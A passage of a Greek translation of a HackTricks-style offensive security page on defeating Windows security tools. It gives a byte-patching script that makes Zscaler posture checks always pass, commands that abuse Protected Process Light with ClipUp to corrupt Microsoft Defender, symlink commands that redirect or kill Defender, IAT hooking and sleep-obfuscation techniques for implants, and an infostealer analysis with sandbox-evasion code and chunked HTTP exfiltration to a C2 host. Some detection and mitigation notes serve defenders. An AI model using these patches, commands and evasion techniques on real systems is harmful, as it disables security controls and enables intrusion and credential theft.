1. Η αξιολόγηση posture γίνεται **αποκλειστικά client-side** (αποστέλλεται ένα boolean στον server).  
2. Τα εσωτερικά RPC endpoints ελέγχουν μόνο ότι το εκτελέσιμο που συνδέεται είναι **signed by Zscaler** (μέσω `WinVerifyTrust`).

Με το **patching τεσσάρων signed binaries στο δίσκο** και οι δύο μηχανισμοί μπορούν να αχρηστευτούν:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Επιστρέφει πάντα `1`, έτσι κάθε έλεγχος θεωρείται compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ οποιαδήποτε (ακόμη και unsigned) διεργασία μπορεί να δεσμεύσει τα RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Αντικαταστάθηκε από `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Παρακαμφθεί |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Μετά την αντικατάσταση των αρχικών αρχείων και την επανεκκίνηση της στοίβας υπηρεσιών:

* **Όλοι** οι έλεγχοι posture εμφανίζονται **πράσινοι/συμμορφούμενοι**.
* Μη υπογεγραμμένα ή τροποποιημένα binaries μπορούν να ανοίξουν τα named-pipe RPC endpoints (π.χ. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ο παραβιασμένος host αποκτά απρόσκοπτη πρόσβαση στο εσωτερικό δίκτυο που ορίζεται από τις πολιτικές Zscaler.

Αυτή η μελέτη περίπτωσης δείχνει πώς καθαρά client-side αποφάσεις εμπιστοσύνης και απλοί έλεγχοι υπογραφής μπορούν να παρακαμφθούν με λίγα byte patches.

## Κατάχρηση του Protected Process Light (PPL) για την παραποίηση του AV/EDR με LOLBINs

Το Protected Process Light (PPL) επιβάλλει μια ιεραρχία signer/level έτσι ώστε μόνο προστατευμένες διεργασίες με ίσο ή υψηλότερο επίπεδο να μπορούν να παραποιούν η μία την άλλη. Επιθετικά, αν μπορείτε νόμιμα να εκκινήσετε ένα PPL-enabled binary και να ελέγξετε τα arguments του, μπορείτε να μετατρέψετε μια καλοήθη λειτουργία (π.χ. logging) σε ένα περιορισμένο, PPL-υποστηριζόμενο write primitive ενάντια σε προστατευμένους φακέλους που χρησιμοποιούνται από το AV/EDR.

What makes a process run as PPL
- Ο target EXE (και τυχόν φορτωμένα DLLs) πρέπει να είναι υπογεγραμμένα με ένα PPL-capable EKU.
- Η διεργασία πρέπει να δημιουργείται με CreateProcess χρησιμοποιώντας τα flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Πρέπει να ζητηθεί ένα συμβατό protection level που ταιριάζει με τον signer του binary (π.χ., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` για anti-malware signers, `PROTECTION_LEVEL_WINDOWS` για Windows signers). Λανθασμένα επίπεδα θα αποτύχουν κατά τη δημιουργία.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Το ψηφιακά υπογεγραμμένο system binary `C:\Windows\System32\ClipUp.exe` αυτο-εκκινεί και δέχεται μια παράμετρο για να γράψει ένα αρχείο καταγραφής σε μονοπάτι που καθορίζεται από τον καλούντα.
- Όταν εκκινείται ως διεργασία PPL, η εγγραφή αρχείου γίνεται με PPL backing.
- Το ClipUp δεν μπορεί να αναλύσει μονοπάτια που περιέχουν κενά· χρησιμοποιήστε 8.3 short paths για να δείξετε σε κανονικά προστατευμένες τοποθεσίες.

8.3 short path helpers
- Απαρίθμηση σύντομων ονομάτων: `dir /x` σε κάθε γονικό κατάλογο.
- Εξαγωγή σύντομης διαδρομής στο cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Εκκινήστε το PPL-capable LOLBIN (ClipUp) με `CREATE_PROTECTED_PROCESS` χρησιμοποιώντας έναν launcher (π.χ., CreateProcessAsPPL).
2) Δώστε το όρισμα log-path του ClipUp για να αναγκάσετε τη δημιουργία αρχείου σε προστατευμένο AV directory (π.χ., Defender Platform). Χρησιμοποιήστε 8.3 short names αν χρειάζεται.
3) Αν το στοχευόμενο binary είναι συνήθως ανοιχτό/κλειδωμένο από το AV ενώ τρέχει (π.χ., MsMpEng.exe), προγραμματίστε την εγγραφή κατά την εκκίνηση πριν ξεκινήσει το AV εγκαθιστώντας μια υπηρεσία auto-start που εκτελείται αξιόπιστα νωρίτερα. Επιβεβαιώστε τη σειρά εκκίνησης με Process Monitor (καταγραφή εκκίνησης).
4) Σε επανεκκίνηση, η εγγραφή με PPL backing γίνεται πριν το AV κλειδώσει τα binaries του, καταστρέφοντας το στοχευόμενο αρχείο και εμποδίζοντας την εκκίνηση.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- Δεν μπορείτε να ελέγχετε τα περιεχόμενα που γράφει το ClipUp πέρα από τη θέση· το primitive είναι κατάλληλο για αλλοίωση παρά για ακριβή έγχυση περιεχομένου.
- Απαιτεί τοπικό admin/SYSTEM για εγκατάσταση/εκκίνηση μιας υπηρεσίας και παράθυρο επανεκκίνησης.
- Ο χρονισμός είναι κρίσιμος: ο στόχος δεν πρέπει να είναι ανοιχτός· η εκτέλεση κατά την εκκίνηση αποφεύγει τους file locks.

Detections
- Δημιουργία διεργασίας `ClipUp.exe` με ασυνήθιστες παραμέτρους, ειδικά όταν έχει ως γονέα μη-τυπικούς εκκινητές, κοντά στην εκκίνηση.
- Νέες υπηρεσίες ρυθμισμένες για auto-start ύποπτων binaries και που εκκινούν συνεπώς πριν το Defender/AV. Ερευνήστε δημιουργία/τροποποίηση υπηρεσίας πριν από σφάλματα εκκίνησης του Defender.
- File integrity monitoring στα Defender binaries/Platform directories· απροσδόκητες δημιουργίες/τροποποιήσεις αρχείων από διεργασίες με protected-process flags.
- ETW/EDR telemetry: αναζητήστε διεργασίες που δημιουργούνται με `CREATE_PROTECTED_PROCESS` και ανώμαλη χρήση επιπέδων PPL από μη-AV binaries.

Mitigations
- WDAC/Code Integrity: περιορίστε ποια signed binaries μπορούν να τρέξουν ως PPL και υπό ποιους γονείς· μπλοκάρετε την εκκίνηση του ClipUp εκτός νόμιμων πλαισίων.
- Service hygiene: περιορίστε τη δημιουργία/τροποποίηση auto-start υπηρεσιών και παρακολουθήστε χειραγώγηση της σειράς εκκίνησης.
- Βεβαιωθείτε ότι το Defender tamper protection και οι early-launch protections είναι ενεργοποιημένα· διερευνήστε σφάλματα εκκίνησης που υποδεικνύουν διαφθορά binaries.
- Σκεφτείτε να απενεργοποιήσετε τη δημιουργία 8.3 short-name σε volumes που φιλοξενούν security tooling εφόσον είναι συμβατό με το περιβάλλον σας (δοκιμάστε διεξοδικά).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Παραποίηση του Microsoft Defender μέσω Platform Version Folder Symlink Hijack

Το Windows Defender επιλέγει την πλατφόρμα από την οποία εκτελείται απαριθμώντας τους υποφακέλους κάτω από:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Επιλέγει τον υποφάκελο με το υψηλότερο λεξικογραφικό version string (π.χ., `4.18.25070.5-0`), και έπειτα εκκινεί τις υπηρεσίες του Defender από εκεί (ενημερώνοντας service/registry paths κατάλληλα). Αυτή η επιλογή εμπιστεύεται directory entries συμπεριλαμβανομένων των directory reparse points (symlinks). Ένας διαχειριστής μπορεί να εκμεταλλευτεί αυτό για να ανακατευθύνει το Defender σε ένα attacker-writable path και να επιτύχει DLL sideloading ή διαταραχή υπηρεσίας.

Preconditions
- Local Administrator (απαραίτητος για δημιουργία directories/symlinks κάτω από τον φάκελο Platform)
- Δυνατότητα επανεκκίνησης ή πρόκλησης επανα-επιλογής πλατφόρμας του Defender (service restart on boot)
- Απαιτούνται μόνο built-in tools (mklink)

Why it works
- Το Defender μπλοκάρει εγγραφές στους δικούς του φακέλους, αλλά η επιλογή πλατφόρμας εμπιστεύεται directory entries και επιλέγει το λεξικογραφικά υψηλότερο version χωρίς να επαληθεύει ότι ο προορισμός επιλύεται σε protected/trusted path.

Step-by-step (example)
1) Προετοιμάστε ένα εγγράψιμο clone του τρέχοντος platform folder, π.χ. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Δημιουργήστε ένα symlink για έναν κατάλογο υψηλότερης έκδοσης μέσα στο Platform που δείχνει στον φάκελό σας:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Επιλογή ενεργοποιητή (συνιστάται επανεκκίνηση):
```cmd
shutdown /r /t 0
```
4) Επαληθεύστε ότι το MsMpEng.exe (WinDefend) τρέχει από την ανακατευθυνόμενη διαδρομή:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Πρέπει να δείτε τη νέα διαδρομή διεργασίας στο `C:\TMP\AV\` και τη ρύθμιση υπηρεσίας/μητρώου που αντανακλά αυτή τη θέση.

Post-exploitation επιλογές
- DLL sideloading/code execution: Αποθέστε/αντικαταστήστε DLLs που φορτώνει ο Defender από τον κατάλογο εφαρμογής του για να εκτελέσετε κώδικα στις διεργασίες του Defender. See the section above: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Αφαιρέστε το version-symlink ώστε στο επόμενο ξεκίνημα η διαμορφωμένη διαδρομή να μην επιλύεται και ο Defender να αποτύχει να ξεκινήσει:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Σημειώστε ότι αυτή η τεχνική δεν παρέχει privilege escalation από μόνη της· απαιτεί admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams can move runtime evasion out of the C2 implant and into the target module itself by hooking its Import Address Table (IAT) and routing selected APIs through attacker-controlled, position‑independent code (PIC). This generalises evasion beyond the small API surface many kits expose (e.g., CreateProcessA), and extends the same protections to BOFs and post‑exploitation DLLs.

Γενική προσέγγιση
- Τοποθετήστε ένα PIC blob δίπλα στο target module χρησιμοποιώντας reflective loader (prepended ή companion). Το PIC πρέπει να είναι self‑contained και position‑independent.
- Καθώς το host DLL φορτώνει, περπατήστε το IMAGE_IMPORT_DESCRIPTOR και τροποποιήστε τις IAT εγγραφές για τα στοχοποιημένα imports (π.χ., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) ώστε να δείχνουν σε thin PIC wrappers.
- Κάθε PIC wrapper εκτελεί evasions πριν κάνει tail‑calling στην πραγματική διεύθυνση του API. Τυπικές evasions περιλαμβάνουν:
  - Memory mask/unmask γύρω από την κλήση (π.χ., encrypt beacon regions, RWX→RX, αλλαγή ονομάτων/δικαιωμάτων σε σελίδες) και επαναφορά μετά την κλήση.
  - Call‑stack spoofing: κατασκευή ενός benign stack και μετάβαση στο target API ώστε η ανάλυση του call‑stack να επιλύει σε αναμενόμενα frames.
- Για συμβατότητα, εξάγετε ένα interface ώστε ένα Aggressor script (ή ισοδύναμο) να μπορεί να καταχωρίσει ποια APIs να κάνετε hook για Beacon, BOFs και post‑ex DLLs.

Why IAT hooking here
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Σημειώσεις
- Εφαρμόστε το patch μετά τα relocations/ASLR και πριν την πρώτη χρήση του import. Reflective loaders όπως TitanLdr/AceLdr δείχνουν hooking κατά τη διάρκεια του DllMain του φορτωμένου module.
- Κρατήστε τα wrappers μικρά και PIC-safe· επιλύστε το πραγματικό API μέσω της αρχικής τιμής IAT που αποθηκεύσατε πριν το patch ή μέσω του LdrGetProcedureAddress.
- Χρησιμοποιήστε RW → RX transitions για PIC και αποφύγετε το να αφήνετε σελίδες writable+executable.

Call‑stack spoofing stub
- Draugr‑style PIC stubs κατασκευάζουν μια ψεύτικη αλυσίδα κλήσεων (return addresses σε benign modules) και στη συνέχεια κάνουν pivot στο πραγματικό API.
- Αυτό παρακάμπτει detections που αναμένουν canonical stacks από Beacon/BOFs προς ευαίσθητα APIs.
- Συνδυάστε με τεχνικές stack cutting/stack stitching για να προσγειωθείτε εντός των αναμενόμενων frames πριν το prologue του API.

Operational integration
- Προσθέστε τον reflective loader πριν από τα post‑ex DLLs ώστε το PIC και τα hooks να αρχικοποιούνται αυτόματα όταν φορτώνεται το DLL.
- Χρησιμοποιήστε ένα Aggressor script για να καταχωρήσετε target APIs ώστε το Beacon και τα BOFs να επωφελούνται διαφανώς από την ίδια διαδρομή evasion χωρίς αλλαγές στον κώδικα.

Detection/DFIR considerations
- IAT integrity: καταχωρήσεις που επιλύονται σε non‑image (heap/anon) διευθύνσεις· περιοδική επαλήθευση των import pointers.
- Stack anomalies: return addresses που δεν ανήκουν σε φορτωμένες images· απότομες μεταβάσεις σε non‑image PIC· ασυνεπής RtlUserThreadStart ancestry.
- Loader telemetry: in‑process writes στην IAT, πρώιμη DllMain δραστηριότητα που τροποποιεί import thunks, απροσδόκητες RX περιοχές που δημιουργούνται κατά το load.
- Image‑load evasion: αν γίνονται hooks στο LoadLibrary*, παρακολουθήστε ύποπτα loads automation/clr assemblies που συσχετίζονται με συμβάντα memory masking.

Συναφή building blocks και παραδείγματα
- Reflective loaders που κάνουν IAT patching κατά το load (π.χ., TitanLdr, AceLdr)
- Memory masking hooks (π.χ., simplehook) και stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (π.χ., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Αν ελέγχετε έναν reflective loader, μπορείτε να κάνετε hook imports **during** `ProcessImports()` αντικαθιστώντας τον pointer `GetProcAddress` του loader με έναν custom resolver που ελέγχει πρώτα για hooks:

- Build a **resident PICO** (persistent PIC object) που επιβιώνει αφότου το transient loader PIC απελευθερωθεί.
- Export μια `setup_hooks()` function που αντικαθιστά τον import resolver του loader (π.χ., `funcs.GetProcAddress = _GetProcAddress`).
- Στο `_GetProcAddress`, παραλείψτε ordinal imports και χρησιμοποιήστε μια hash‑based hook lookup όπως `__resolve_hook(ror13hash(name))`. Αν υπάρχει hook, επιστρέψτε το· αλλιώς αναθέστε στον πραγματικό `GetProcAddress`.
- Καταχωρήστε hook targets κατά το link time με Crystal Palace `addhook "MODULE$Func" "hook"` καταχωρήσεις. Το hook παραμένει έγκυρο επειδή ζει εντός του resident PICO.

Αυτό παράγει **import-time IAT redirection** χωρίς να κάνετε patch στο code section του φορτωμένου DLL μετά το load.

### Forcing hookable imports when the target uses PEB-walking

Τα import-time hooks ενεργοποιούνται μόνο αν η συνάρτηση υπάρχει στην IAT του target. Αν ένα module επιλύει APIs μέσω PEB-walk + hash (χωρίς import entry), επιβάλετε ένα πραγματικό import ώστε το `ProcessImports()` του loader να το δει:

- Αντικαταστήστε την hashed export resolution (π.χ., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) με απευθείας αναφορά όπως `&WaitForSingleObject`.
- Ο compiler θα εκδώσει μια IAT entry, επιτρέποντας την παρεμπόδιση όταν ο reflective loader επιλύει τα imports.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

Αντί να κάνετε patch το `Sleep`, κάντε hook στα πραγματικά wait/IPC primitives που χρησιμοποιεί το implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Για μεγάλα waits, τυλίξτε την κλήση σε μια Ekko‑style obfuscation αλυσίδα που κρυπτογραφεί την εικόνα στη μνήμη κατά τη διάρκεια του idle:

- Χρησιμοποιήστε `CreateTimerQueueTimer` για να προγραμματίσετε μια ακολουθία callbacks που καλούν `NtContinue` με crafted `CONTEXT` frames.
- Τυπική αλυσίδα (x64): ρυθμίστε την image σε `PAGE_READWRITE` → RC4 encrypt μέσω `advapi32!SystemFunction032` πάνω στην πλήρη mapped image → εκτελέστε το blocking wait → RC4 decrypt → **ανακτήστε τα per‑section permissions** περπατώντας τα PE sections → σηματοδοτήστε την ολοκλήρωση.
- Το `RtlCaptureContext` παρέχει ένα template `CONTEXT`; κλωνοποιήστε το σε πολλαπλά frames και ορίστε registers (`Rip/Rcx/Rdx/R8/R9`) για να εκτελέσετε κάθε βήμα.

Λειτουργική λεπτομέρεια: επιστρέψτε “success” για μεγάλα waits (π.χ., `WAIT_OBJECT_0`) ώστε ο καλών να συνεχίσει ενώ η image είναι masked. Αυτό το pattern κρύβει το module από scanners κατά τα idle παράθυρα και αποφεύγει το κλασικό signature του “patched `Sleep()`”.

Detection ideas (telemetry-based)
- Συστοιχίες `CreateTimerQueueTimer` callbacks που δείχνουν σε `NtContinue`.
- Χρήση του `advapi32!SystemFunction032` σε μεγάλα συνεχή buffers μεγέθους image.
- Large‑range `VirtualProtect` ακολουθούμενο από custom per‑section permission restoration.


## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

Το SantaStealer (aka BluelineStealer) δείχνει πώς οι σύγχρονοι info‑stealers συνδυάζουν AV bypass, anti‑analysis και credential access σε μια ενιαία ροή εργασίας.

### Keyboard layout gating & sandbox delay

- Μια config flag (`anti_cis`) απαριθμεί τα εγκατεστημένα keyboard layouts μέσω `GetKeyboardLayoutList`. Αν βρεθεί Cyrillic layout, το δείγμα αφήνει έναν κενό `CIS` marker και τερματίζει πριν τρέξει τους stealers, διασφαλίζοντας ότι ποτέ δεν εκρήγνυται σε αποκλεισμένες τοπικές ρυθμίσεις ενώ αφήνει ένα hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Πολυεπίπεδη λογική `check_antivm`

- Variant A διασχίζει τη λίστα διεργασιών, hashes κάθε όνομα με ένα custom rolling checksum, και το συγκρίνει με embedded blocklists για debuggers/sandboxes· επαναλαμβάνει το checksum στο όνομα του υπολογιστή και ελέγχει working directories όπως `C:\analysis`.
- Variant B ελέγχει system properties (process-count floor, recent uptime), καλεί `OpenServiceA("VBoxGuest")` για να ανιχνεύσει VirtualBox additions, και εκτελεί timing checks γύρω από sleeps για να εντοπίσει single-stepping. Οποιοδήποτε hit ακυρώνει πριν από το launch των modules.

### Fileless helper + double ChaCha20 reflective loading

- The primary DLL/EXE ενσωματώνει ένα Chromium credential helper που είτε γίνεται dropped to disk είτε manually mapped in-memory· το fileless mode resolves imports/relocations μόνο του ώστε να μην γραφτούν helper artifacts στο δίσκο.
- That helper αποθηκεύει ένα second-stage DLL κρυπτογραφημένο δύο φορές με ChaCha20 (two 32-byte keys + 12-byte nonces). Μετά και τις δύο passes, reflectively loads το blob (no `LoadLibrary`) και καλεί τα exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` που προέρχονται από [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Οι ChromElevator routines χρησιμοποιούν direct-syscall reflective process hollowing για injection σε live Chromium browser, κληρονομούν AppBound Encryption keys, και decrypt passwords/cookies/credit cards απευθείας από SQLite databases παρά την ABE hardening.

### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` επαναλαμβάνει έναν global `memory_generators` function-pointer table και spawnάρει ένα thread ανά enabled module (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Κάθε thread γράφει αποτελέσματα σε shared buffers και αναφέρει το file count του μετά από ~45s join window.
- Μόλις τελειώσει, όλα συμπιέζονται με τη statically linked `miniz` library ως `%TEMP%\\Log.zip`. Το `ThreadPayload1` μετά sleeps 15s και streamάρει το archive σε 10 MB chunks μέσω HTTP POST προς `http://<C2>:6767/upload`, spoofάροντας ένα browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Κάθε chunk προσθέτει `User-Agent: upload`, `auth: <build_id>`, προαιρετικό `w: <campaign_tag>`, και το τελευταίο chunk επισυνάπτει `complete: true` ώστε το C2 να γνωρίζει ότι η επανασυναρμολόγηση ολοκληρώθηκε.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
